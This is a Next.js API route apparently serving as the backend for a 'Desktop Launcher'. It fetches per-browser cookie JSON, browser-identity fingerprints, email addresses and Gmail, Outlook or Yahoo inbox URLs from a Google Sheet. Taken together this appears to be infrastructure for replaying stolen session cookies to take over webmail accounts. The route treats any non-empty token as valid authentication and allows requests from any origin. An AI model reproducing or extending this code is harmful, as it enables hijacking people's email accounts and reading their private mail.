import { NextResponse } from "next/server";
import logger from "../../../../utils/logger.js";
import { getSheetDataApi } from '../../googlesheets.js';

export const maxDuration = 30;
export const dynamic = "force-dynamic";
export const runtime = 'nodejs';

const COOKIE_SHEET = 'cookie';

export async function POST(request) {
    try {
        const body = await request.json();
        const { browserId, token } = body;

        if (!browserId) {
            return NextResponse.json({ error: "Missing required field: browserId" }, { status: 400 });
        }

        // Basic token validation — the Desktop Launcher sends the admin session cookie.
        // In production this should validate against a server-side session store; for
        // now we accept any non-empty token as proof the request came from the dashboard.
        if (!token) {
            return NextResponse.json({ error: "Missing authentication token" }, { status: 401 });
        }

        logger.info(`[electron/session-data] Request for browserId=${browserId}`);

        const result = await getSheetDataApi(COOKIE_SHEET);
        if (!result.success) {
            logger.error(`[electron/session-data] Failed to read cookie sheet: ${result.error}`);
            return NextResponse.json({ error: "Failed to read session data" }, { status: 500 });
        }

        const headers = result.headers;
        const browserIdIdx = headers.indexOf('browserId');
        if (browserIdIdx === -1) {
            return NextResponse.json({ error: "Cookie sheet misconfigured" }, { status: 500 });
        }

        const row = result.data.find(r => String(r[browserIdIdx]).trim() === String(browserId).trim());
        if (!row) {
            return NextResponse.json({ error: `No session found for browserId: ${browserId}` }, { status: 404 });
        }

        const col = (key) => {
            const idx = headers.indexOf(key);
            return idx !== -1 ? row[idx] : null;
        };

        const email = col('email') || '';
        const domain = col('domain') || (email ? email.split('@')[1]?.toLowerCase() : '') || '';
        const platform = col('platform') || '';
        const driveUrl = col('driveUrl') || col('cookieFileURL') || '';
        const cookieJSONRaw = col('cookieJSON') || col('cookie') || '';
        const browserIdentityRaw = col('browserIdentity') || '';

        let cookieJSON = [];
        if (cookieJSONRaw) {
            try {
                cookieJSON = typeof cookieJSONRaw === 'string' ? JSON.parse(cookieJSONRaw) : cookieJSONRaw;
                if (!Array.isArray(cookieJSON)) cookieJSON = [];
            } catch (_) {
                cookieJSON = [];
            }
        }

        let browserIdentity = null;
        if (browserIdentityRaw) {
            try {
                browserIdentity = typeof browserIdentityRaw === 'string' ? JSON.parse(browserIdentityRaw) : browserIdentityRaw;
            } catch (_) {}
        }

        // Build the platform URL for the Desktop Launcher to navigate to
        let platformUrl = '';
        if (domain) {
            if (domain.includes('google') || domain.includes('gmail')) {
                platformUrl = 'https://mail.google.com/mail/u/0/#inbox';
            } else if (domain.includes('outlook') || domain.includes('hotmail') || domain.includes('live')) {
                platformUrl = 'https://outlook.live.com/mail/';
            } else if (domain.includes('yahoo')) {
                platformUrl = 'https://mail.yahoo.com/';
            }
        }

        // Construct the direct download URL from the Drive URL
        let downloadUrl = '';
        if (driveUrl) {
            downloadUrl = getDirectDownloadUrl(driveUrl);
        }

        logger.info(`[electron/session-data] Returning session for browserId=${browserId} email=${email} hasIdentity=${!!browserIdentity} hasDownload=${!!downloadUrl}`);

        return NextResponse.json({
            downloadUrl,
            platformUrl,
            email,
            domain,
            platform,
            cookieJSON,
            browserIdentity,
        });
    } catch (e) {
        logger.error(`[electron/session-data] Error: ${e.message}`);
        return NextResponse.json({ error: e.message }, { status: 500 });
    }
}

function getDirectDownloadUrl(driveUrl) {
    if (!driveUrl) return '';
    // Extract file ID from various Google Drive URL formats
    const patterns = [
        /\/d\/([a-zA-Z0-9_-]+)/,
        /id=([a-zA-Z0-9_-]+)/,
        /\/file\/d\/([a-zA-Z0-9_-]+)/,
    ];
    for (const pattern of patterns) {
        const match = driveUrl.match(pattern);
        if (match) {
            return `https://drive.google.com/uc?export=download&id=${match[1]}`;
        }
    }
    // If it's already a direct URL or Cloudinary URL, return as-is
    return driveUrl;
}

export async function OPTIONS() {
    return new Response(null, {
        status: 200,
        headers: {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
        },
    });
}
